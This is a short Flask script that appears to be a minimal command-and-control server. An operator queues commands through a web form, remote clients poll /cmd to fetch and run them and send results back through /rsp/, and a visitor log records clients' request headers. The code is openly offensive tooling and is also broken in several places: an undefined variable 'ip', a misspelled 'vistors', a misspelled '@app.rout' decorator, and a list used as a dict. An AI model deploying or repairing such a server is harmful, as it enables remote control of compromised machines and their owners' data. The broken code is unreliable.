

from flask import Flask,redirect,request
from datetime import datetime

app = Flask(__name__)
cmdstack = []
rdata = []
visitors = []

@app.route('/')
def hmmm():
    url = "https://wxcafe.net/pub/Hackers%20%281995%29/Hackers%20%281995%29.mp4"
    return redirect(url, code=302)
@app.route('/banana')
def index():
    return f'''
    <style>
        body{{
            background-color:#222222;
            color: white;
        }}
    </style>
    <br/>
    <h1>Queue:</h1>
    {"<br/>".join(cmdstack)}
    <h1>Returned data:</h1>
    {"<br/>".join(rdata)}
    <h1>Command:</h1>
     <form action="/lol" method="post">
        <input type="text" id="command" name="command" /><br><br>
        <input type="submit" value=">">
    </form> 
    '''
@app.route('/lol', methods=['POST'])
def lol():
    command = request.form.get('command')
    cmdstack.append(command)
    return redirect('/banana', code=302)
@app.route('/cmd')
def cmd():
    if not ip in visitors:
        vistors[ip] = [datetime.now(),dict(request.headers)]
    if not len(cmdstack):
        return ''
    return cmdstack.pop()
@app.route('/rsp/<data>')
def rsp(data):
    rdata.append(data)
    return 'lol'
@app.rout('visitlog23')
def log():
    return visitors

if __name__=='__main__':
    app.run('0.0.0.0',port=1337)